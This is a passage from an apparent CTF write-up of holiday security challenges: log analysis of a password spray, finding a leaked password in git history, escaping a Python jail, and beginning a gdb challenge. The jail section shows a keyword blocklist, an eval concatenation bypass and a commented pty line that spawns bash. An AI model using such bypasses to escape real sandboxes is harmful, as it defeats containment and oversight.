        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"KeyLength"</span>&gt;0&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"ProcessId"</span>&gt;0x00000000000019f0&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"ProcessName"</span>&gt;C:\Windows\System32\inetsrv\w3wp.exe&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"IpAddress"</span>&gt;10.158.210.210&lt;/<span style="color: #0000ff;">Data</span>&gt;
        &lt;<span style="color: #0000ff;">Data</span> <span style="color: #a0522d;">Name</span>=<span style="color: #8b2252;">"IpPort"</span>&gt;47904&lt;/<span style="color: #0000ff;">Data</span>&gt;
    &lt;/<span style="color: #0000ff;">EventData</span>&gt;
&lt;/<span style="color: #0000ff;">Event</span>&gt;
</pre>
</div>

<p>
At this point, there's a few ways we can proceed to analyze the
logs. However, parsing XML data becomes tricky with the standard
*NIX text-processing tools (<code>grep</code>, <code>sed</code>, <code>awk</code>, etc.). Instead,
we'll write up a Python script:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> xml.dom <span style="color: #a020f0;">import</span> minidom

<span style="color: #a0522d;">event_names</span> = {<span style="color: #8b2252;">'4624'</span>: <span style="color: #8b2252;">'Success'</span>, <span style="color: #8b2252;">'4625'</span>: <span style="color: #8b2252;">'Failure'</span>}

<span style="color: #b22222;"># </span><span style="color: #b22222;">Parse the file</span>
<span style="color: #a0522d;">xmldoc</span> = minidom.parse(<span style="color: #8b2252;">'ho-ho-no.xml'</span>)

<span style="color: #b22222;"># </span><span style="color: #b22222;">Top-node: &lt;Event&gt;</span>
<span style="color: #a0522d;">events</span> = xmldoc.getElementsByTagName(<span style="color: #8b2252;">'Event'</span>)

<span style="color: #a020f0;">for</span> event <span style="color: #a020f0;">in</span> events:
    <span style="color: #b22222;"># </span><span style="color: #b22222;">Each Event has &lt;System&gt; and &lt;EventData&gt;</span>
    <span style="color: #a0522d;">system</span> = event.getElementsByTagName(<span style="color: #8b2252;">'System'</span>)[0]
    <span style="color: #a0522d;">eventdata</span> = event.getElementsByTagName(<span style="color: #8b2252;">'EventData'</span>)[0]
    <span style="color: #a0522d;">eventid</span> = system.getElementsByTagName(<span style="color: #8b2252;">'EventID'</span>)[0].firstChild.nodeValue

    <span style="color: #a020f0;">if</span> eventid <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> event_names.keys():
        <span style="color: #b22222;"># </span><span style="color: #b22222;">We don't care about other events</span>
        <span style="color: #a020f0;">continue</span>

    <span style="color: #b22222;"># </span><span style="color: #b22222;">EventData has one ore more &lt;Data&gt; elements</span>
    <span style="color: #a0522d;">data_nodes</span> = eventdata.getElementsByTagName(<span style="color: #8b2252;">'Data'</span>)
    <span style="color: #a020f0;">for</span> data <span style="color: #a020f0;">in</span> data_nodes:
        <span style="color: #a020f0;">if</span> data.attributes[<span style="color: #8b2252;">'Name'</span>].nodeValue == <span style="color: #8b2252;">'TargetUserName'</span>:
            <span style="color: #a020f0;">print</span> event_names[eventid], data.firstChild.nodeValue
</pre>
</div>

<p>
When we run the script, we get the authentication result, and the username. The last lines printed are along the lines of:
</p>

<pre class="example">
elf@spray-detect:~$ python parse_evtx.py
...
Success HealthMailboxbe58608
Success HealthMailboxbe58608
Success HealthMailboxbe58608
Success HealthMailboxbab78a6
Success HealthMailboxbe58608
Success HealthMailboxbab78a6
Success HealthMailboxbe58608
Success HealthMailboxbe58608
Success HealthMailboxbe58608
Success HealthMailboxbe58608
Success HealthMailboxbe58608
</pre>

<p>
We can use <code>grep</code> to ignore the mailbox. This time, we'll use the <code>-v</code> flag: <code>-v, --invert-match    Selected lines are those not matching any of the specified patterns.</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ python parse_evtx.py | grep -v HealthMailbox
...
Failure steven.smith
Failure sugerplum.mary
Failure sunil.kumar
Failure suresh.kumar
Failure tim.smith
Failure tom.smith
Failure tyler.smith
Failure vijay.kumar
Failure vinod.kumar
Failure wunorse.openslae
Success minty.candycane
Success wunorse.openslae
Success SYSTEM
</pre>
</div>

<p>
This does look like a password spraying attack. We see a large
number of failures, going alphabetically. Interestingly, it seems
like SugarPlum Mary's account name is misspelled, leading more
credence to the theory that the attacker is going off of a list of
usernames.
</p>

<p>
After the failures, we see successful logins for Minty and
Wunorse. To get a better sense of what's going on, we'll update
our script to add the timestamp and IP address as well:
</p>

<pre class="example">
2018-09-10 12:54:56.034510 Failure test.user 172.31.254.101
2018-09-10 12:58:07.518818 Success shinny.upatree 172.18.101.231
2018-09-10 13:03:33.271959 Failure aaron.smith 172.31.254.101
2018-09-10 13:03:34.075348 Failure abhishek.kumar 172.31.254.101
2018-09-10 13:03:34.660316 Failure adam.smith 172.31.254.101
2018-09-10 13:03:35.204905 Failure ahmed.ali 172.31.254.101
2018-09-10 13:03:35.766270 Failure ahmed.hassan 172.31.254.101
...
2018-09-10 13:05:03.702278 Success minty.candycane 172.31.254.101
...
2018-09-10 13:05:37.099594 Failure tyler.smith 172.31.254.101
2018-09-10 13:05:37.695000 Failure vijay.kumar 172.31.254.101
2018-09-10 13:05:38.474575 Failure vinod.kumar 172.31.254.101
2018-09-10 13:05:39.123190 Failure wunorse.openslae 172.31.254.101
2018-09-10 13:07:02.556292 Success minty.candycane 172.31.254.101
2018-09-10 13:10:18.123104 Success wunorse.openslae 10.231.108.200
2018-09-10 13:13:16.175577 Success SYSTEM -
</pre>

<p>
It looks like the attack started at 12:54, with "test.user," then
proceeded alphabetically, ending about 10 minutes later, at
13:05. All of those attempts came from the same IP address, 172.31.254.101.
</p>

<p>
As the attacker was trying passwords, they were able to
successfully login as minty.candycane. After the attack ended,
they logged in as minty.candycane again. Her account is the only
account from that IP address that had a successful login.
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@spray-detect:~$ ./runtoanswer 
Loading, please wait......



Whose account was successfully accessed by the attacker<span style="color: #8b2252;">'s password spray? minty.candycane</span>


<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM</span>
<span style="color: #8b2252;">MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM</span>
<span style="color: #8b2252;">Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M</span>
<span style="color: #8b2252;">MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM</span>
<span style="color: #8b2252;">MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM</span>
<span style="color: #8b2252;">M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM</span>
<span style="color: #8b2252;">MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM</span>
<span style="color: #8b2252;">MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM</span>
<span style="color: #8b2252;">MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM</span>
<span style="color: #8b2252;">MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM</span>
<span style="color: #8b2252;">MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM</span>
<span style="color: #8b2252;">MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM</span>
<span style="color: #8b2252;">MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM</span>
<span style="color: #8b2252;">M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM</span>
<span style="color: #8b2252;">MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM</span>
<span style="color: #8b2252;">MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM</span>
<span style="color: #8b2252;">MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M</span>
<span style="color: #8b2252;">MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM</span>
<span style="color: #8b2252;">MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span style="color: #8b2252;">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>

<span style="color: #8b2252;">Silly Minty Candycane, well this is what she gets.</span>
<span style="color: #8b2252;">"Winter2018" isn'</span>t for The Internets.
Passwords formed with season-year are on the hackers<span style="color: #8b2252;">' list.</span>
<span style="color: #8b2252;">Maybe we should look at guidance published by the NIST?</span>

<span style="color: #8b2252;">Congratulations!</span>
</pre>
</div>

<p>
Silly Minty, indeed. If only she had listened to Beau's talk&#x2026;
</p>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
minty.candycane
</p>

</div>
</div>
</div>
<div id="outline-container-org56cb83f" class="outline-4">
<h4 id="org56cb83f">Summary</h4>
<div class="outline-text-4" id="text-org56cb83f">
<p>
Using the provided script, we converted the event logs to
XML. Using basic \*NIX text-processing tools, we got an overview
of the logs, then wrote a Python script to print out the relevant
details. The password spraying attack was easy to spot, and all
the attempts came from a single IP address. Only one user,
minty.candycane, had a successful login from that IP.
</p>
</div>
</div>
</div>
<div id="outline-container-org93e8879" class="outline-3">
<h3 id="gitpasshist"><a id="org93e8879"></a>Git Dev Ops Fail</h3>
<div class="outline-text-3" id="text-gitpasshist">
<div id="text-table-of-contents">
<ul>
<li><a href="#org39b703b">Goal</a></li>
<li><a href="#org61632c9">Background</a></li>
<li><a href="#org3dec670">Intro</a></li>
<li><a href="#orgdccad23">Solution</a></li>
<li><a href="#org2bec37d">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org39b703b" class="outline-4">
<h4 id="org39b703b">Goal</h4>
<div class="outline-text-4" id="text-org39b703b">
<div class="note">
<p>
Find Sparkle's password, then run the runtoanswer tool.
</p>

</div>
</div>
</div>
<div id="outline-container-org61632c9" class="outline-4">
<h4 id="org61632c9">Background</h4>
<div class="outline-text-4" id="text-org61632c9">
</div>
<ul class="org-ul">
<li><a id="org180bf75"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org180bf75">
<p>
Sparkle Redberry asks us to help her by saying:
</p>
<blockquote>
<p>
Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo.
</p>

<p>
I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it!
</p>

<p>
Care to check my Cranberry Pi terminal and prove me right?
</p>
</blockquote>
</div>
</li>
<li><a id="org60be899"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org60be899">
<p>
To help us, Sparkle provides two links: <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">Finding Passwords in Git</a> and <a href="https://gist.github.com/hofmannsven/6814451">Git Cheat Sheet</a>.
</p>
</div>
</li>
<li><a id="org4bb48e1"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-org4bb48e1">
<p>
<a href="https://www.youtube.com/watch?v=myKrWVaq3Cw">Brian Hostetler, Buried Secrets: Digging Deep Through Cloud
Repositories</a> seems relevant, but it relies on using tools to
search for secrets; something we can't easily do on the terminal.
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org3dec670" class="outline-4">
<h4 id="org3dec670">Intro</h4>
<div class="outline-text-4" id="text-org3dec670">
<p>
Once we connect:
</p>

<pre class="example">
Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.

Urging - I scolded, "Don't put creds in git!"
She said, "Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should."

Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our "oops,"
Please find it fast before some other snoops!

Find Sparkle's password, then run the runtoanswer tool.
</pre>
</div>
</div>
<div id="outline-container-orgdccad23" class="outline-4">
<h4 id="orgdccad23">Solution</h4>
<div class="outline-text-4" id="text-orgdccad23">
<p>
<asciinema-player src="casts/gitpasshist.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
First, we see what we're working with:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@gitpasshist:~$ ls
kcconfmgmt  runtoanswer
elf@gitpasshist:~$ cd kcconfmgmt/
elf@gitpasshist:~/kcconfmgmt$ ls
README.md  app.js  package-lock.json  package.json  public  routes  server  views
elf@gitpasshist:~/kcconfmgmt$ ls --all
.  ..  .git  README.md  app.js  package-lock.json  package.json  public  routes  server  views
</pre>
</div>

<p>
kcconfmgmt is a git repo, and we need to find some credentials in the history. The Git Cheat Sheet gives us the following command to search commits: <code>git log --grep="Message"</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@gitpasshist:~/kcconfmgmt$ git log --grep=<span style="color: #8b2252;">"password"</span>
commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d
Author: Sparkle Redberry <a href="mailto:sredberry%40kringlecon.com">&lt;sredberry@kringlecon.com&gt;</a>
Date:   Sat Nov 10 19:51:52 2018 -0500

    Add user model for authentication, bcrypt password storage

commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <a href="mailto:sredberry%40kringlecon.com">&lt;sredberry@kringlecon.com&gt;</a>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings 
    <span style="color: #a020f0;">in</span> config.js.def need to be updated before use
</pre>
</div>

<p>
To view the changes, the cheat sheet suggests the following command:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@gitpasshist:~/kcconfmgmt$ git log -p 60a2ffea7520ee980a5fc60177ff4d0633f2516b
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <a href="mailto:sredberry%40kringlecon.com">&lt;sredberry@kringlecon.com&gt;</a>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings<span style="color: #a020f0;"> in</span> config.js.def need to be updated before use

diff --git a/server/config/config.js b/server/config/config.js
deleted file mode 100644
index 25be269..0000000
--- a/server/config/config.js
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    <span style="color: #8b2252;">'url'</span> : <span style="color: #8b2252;">'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'</span>
-};
diff --git a/server/config/config.js.def b/server/config/config.js.def
new file mode 100644
index 0000000..740eba5
--- /dev/null
+++ b/server/config/config.js.def
@@ -0,0 +1,4 @@
+// Database URL
+module.exports = {
+    <span style="color: #8b2252;">'url'</span> : <span style="color: #8b2252;">'mongodb://username:password@127.0.0.1:27017/node-api'</span>
+};
</pre>
</div>

<p>
We see that in <code>config.js</code>, the credentials were sredberry and "twinkletwinkletwinkle":
</p>

<pre class="example">
elf@gitpasshist:~$ ./runtoanswer 
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
</pre>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
twinkletwinkletwinkle
</p>

</div>
</div>
</div>
<div id="outline-container-org2bec37d" class="outline-4">
<h4 id="org2bec37d">Summary</h4>
<div class="outline-text-4" id="text-org2bec37d">
<p>
We got fairly lucky on this one. We searched commits for
"password," and then viewed the details of an interesting commit.
</p>
</div>
</div>
</div>
<div id="outline-container-orga43d566" class="outline-3">
<h3 id="python_docker_challenge"><a id="orga43d566"></a>Python Escape from LA</h3>
<div class="outline-text-3" id="text-python_docker_challenge">
<div id="text-table-of-contents">
<ul>
<li><a href="#org27ba393">Goal</a></li>
<li><a href="#org5e483e4">Background</a></li>
<li><a href="#org2086b4e">Intro</a></li>
<li><a href="#org41b8e8b">Solution</a></li>
<li><a href="#orgdd6f95d">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org27ba393" class="outline-4">
<h4 id="org27ba393">Goal</h4>
<div class="outline-text-4" id="text-org27ba393">
<div class="note">
<p>
To complete this challenge, escape Python and run ./i_escaped
</p>

</div>
</div>
</div>
<div id="outline-container-org5e483e4" class="outline-4">
<h4 id="org5e483e4">Background</h4>
<div class="outline-text-4" id="text-org5e483e4">
</div>
<ul class="org-ul">
<li><a id="org3cef0dd"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org3cef0dd">
<p>
SugarPlum Mary has a problem
</p>

<blockquote>
<p>
I'm glad you're here; my terminal is trapped inside a python! Or maybe my python is trapped inside a terminal?
</p>

<p>
Can you please help me by escaping from the Python interpreter?
</p>
</blockquote>
</div>
</li>
<li><a id="orgeabd6ba"></a>Badge Hint<br />
<div class="outline-text-5" id="text-orgeabd6ba">
<p>
SugarPlum's advice is to check out <a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c">Mark Baggett's talk upstairs</a>.
</p>
</div>
</li>
<li><a id="orgc60a938"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgc60a938">
<p>
<a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c">Mark Baggett, Escaping Python Shells</a>
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org2086b4e" class="outline-4">
<h4 id="org2086b4e">Intro</h4>
<div class="outline-text-4" id="text-org2086b4e">
<p>
Launching this terminal, we see something a bit different:
</p>

<pre class="example">
I'm another elf in trouble,
Caught within this Python bubble.

Here I clench my merry elf fist -
Words get filtered by a black list!

Can't remember how I got stuck,
Try it - maybe you'll have more luck?

For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!

-SugarPlum Mary

To complete this challenge, escape Python
and run ./i_escaped
&gt;&gt;&gt; 
</pre>
</div>
</div>
<div id="outline-container-org41b8e8b" class="outline-4">
<h4 id="org41b8e8b">Solution</h4>
<div class="outline-text-4" id="text-org41b8e8b">
<p>
<asciinema-player src="casts/python_docker_challenge.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
We need to run <code>i_escaped</code>, either from Python, or after we've escaped. A simple way to exit Python is to call <code>sys.exit</code>:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; sys.<span style="color: #008b8b;">exit</span>(0)
Traceback (most recent call last):
  File <span style="color: #8b2252;">"&lt;console&gt;"</span>, line 1, <span style="color: #a020f0;">in</span> &lt;module&gt;
<span style="color: #228b22;">NameError</span>: name <span style="color: #8b2252;">'sys'</span> <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> defined
&gt;&gt;&gt; <span style="color: #a020f0;">import</span> sys
Use of the command <span style="color: #a020f0;">import</span> <span style="color: #a020f0;">is</span> prohibited <span style="color: #a020f0;">for</span> this question.
</pre>
</div>

<p>
Foiled. Watching Mark's talk, we see similarities with using <code>readfunc</code> to filter prohibited words. Mark suggests checking to see if <code>exec()</code> is available:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #a020f0;">exec</span>
Use of the command <span style="color: #a020f0;">exec</span> <span style="color: #a020f0;">is</span> prohibited <span style="color: #a020f0;">for</span> this question.
</pre>
</div>

<p>
Next, let's try <code>eval()</code>:
</p>
<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #483d8b;">eval</span>
&lt;built-<span style="color: #a020f0;">in</span> function <span style="color: #483d8b;">eval</span>&gt;
</pre>
</div>

<p>
That's promising. We try what Mark suggests using <code>eval</code>:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; os.system(<span style="color: #8b2252;">"./i_escaped"</span>)
Use of the command os.system <span style="color: #a020f0;">is</span> prohibited <span style="color: #a020f0;">for</span> this question.
&gt;&gt;&gt; <span style="color: #483d8b;">eval</span>(<span style="color: #8b2252;">'os.sy'</span> + <span style="color: #8b2252;">'stem("./i_escaped")'</span>)
Loading, please wait......


  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| <span style="color: #8b2252;">'_ \ / _ \| '</span>_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | <span style="color: #8b2252;">'_ \ / _ \/ _` | |</span>
<span style="color: #8b2252;"> | |___\__ \ (_| (_| | |_) |  __/ (_| |_|</span>
<span style="color: #8b2252;"> |_____|___/\___\__,_| .__/ \___|\__,_(_)</span>
<span style="color: #8b2252;">                     |_|                             </span>


<span style="color: #8b2252;">That'</span>s some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary

You escaped! Congratulations!
</pre>
</div>

<p>
Once we've escaped, we can see how this challenge was setup:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">restricted_terms</span> = [<span style="color: #8b2252;">'import'</span>,<span style="color: #8b2252;">'pty'</span>, <span style="color: #8b2252;">'open'</span>,<span style="color: #8b2252;">'exec'</span>,<span style="color: #8b2252;">"compile"</span>, <span style="color: #8b2252;">"os.system"</span>, 
                    <span style="color: #8b2252;">"subprocess."</span>, <span style="color: #8b2252;">"reload"</span>, <span style="color: #8b2252;">"__builtins__"</span> ,<span style="color: #8b2252;">"__class__"</span>,<span style="color: #8b2252;">"__mro__"</span> ]
code.interact(banner=banner, readfunc=readfilter, local=<span style="color: #483d8b;">locals</span>())
<span style="color: #b22222;">#</span><span style="color: #b22222;">eval("__im"+"port__('p'+'ty').s"+"pawn('/bin/bash')")    </span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgdd6f95d" class="outline-4">
<h4 id="orgdd6f95d">Summary</h4>
<div class="outline-text-4" id="text-orgdd6f95d">
<p>
We basically followed Mark's talk directly. <code>import</code> and <code>exec</code>
was blocked, but <code>eval</code> was available. We called <code>i_escaped</code>
directly from Python, without ever actually escaping.
</p>
</div>
</div>
</div>
<div id="outline-container-org785ac06" class="outline-3">
<h3 id="unlinked-function"><a id="org785ac06"></a>The GDB Sleighbell Lottery</h3>
<div class="outline-text-3" id="text-unlinked-function">
<div id="text-table-of-contents">
<ul>
<li><a href="#org91e2009">Goal</a></li>
<li><a href="#org4923523">Background</a></li>
<li><a href="#org491f625">Intro</a></li>
<li><a href="#org1c20fbc">Solution</a></li>
<li><a href="#org2ab6949">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org91e2009" class="outline-4">
<h4 id="org91e2009">Goal</h4>
<div class="outline-text-4" id="text-org91e2009">
<div class="note">
<p>
Complete this challenge by winning the sleighbell lottery for
Shinny Upatree.
</p>

</div>
</div>
</div>
<div id="outline-container-org4923523" class="outline-4">
<h4 id="org4923523">Background</h4>
<div class="outline-text-4" id="text-org4923523">
</div>
<ul class="org-ul">
<li><a id="org95b075d"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org95b075d">
<p>
Shinny is desperate to win the lottery:
</p>

<blockquote>
<p>
Hey! Mind giving ole' Shinny Upatree some help? There's a contest I HAVE to win.
</p>

<p>
As long as no one else wins first, I can just keep trying to win the Sleigh Bell Lotto, but this could take forever!
</p>

<p>
I'll bet the GNU Debugger can help us. With the PEDA modules installed, it can be prettier. I mean easier.
</p>
</blockquote>
</div>
</li>
<li><a id="org90b1cb0"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org90b1cb0">
<p>
Shinny recommends the SANS blog post <a href="https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions">Using gdb to Call Random Functions!</a>
</p>
</div>
</li>
<li><a id="org8bc3d3f"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-org8bc3d3f">
<p>
None
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org491f625" class="outline-4">
<h4 id="org491f625">Intro</h4>
<div class="outline-text-4" id="text-org491f625">
<p>
The terminal greets us with:
</p>

<pre class="example">
I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
</pre>
</div>
</div>
<div id="outline-container-org1c20fbc" class="outline-4">
<h4 id="org1c20fbc">Solution</h4>
<div class="outline-text-4" id="text-org1c20fbc">
<p>
<asciinema-player src="casts/unlinked-function.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
We start by investigating our surroundings:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@unlinked-function:~$ ls
gdb  objdump  sleighbell-lotto
elf@unlinked-function:~$ ls -l
total 40
lrwxrwxrwx 1 elf  elf     12 Dec 14 16:21 gdb -&gt; /usr/bin/gdb
lrwxrwxrwx 1 elf  elf     16 Dec 14 16:21 objdump -&gt; /usr/bin/objdump
-rwxr-xr-x 1 root root 38144 Dec 14 16:22 sleighbell-lotto
</pre>
</div>

<p>
We start following along with the blog post. We'll start with <code>nm</code> (display name list), and as the post tells us to focus on symbol types 'T' (text section symbols):
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@unlinked-function:~$ nm ./sleighbell-lotto | grep <span style="color: #8b2252;">' T '</span>
0000000000001620 T __libc_csu_fini
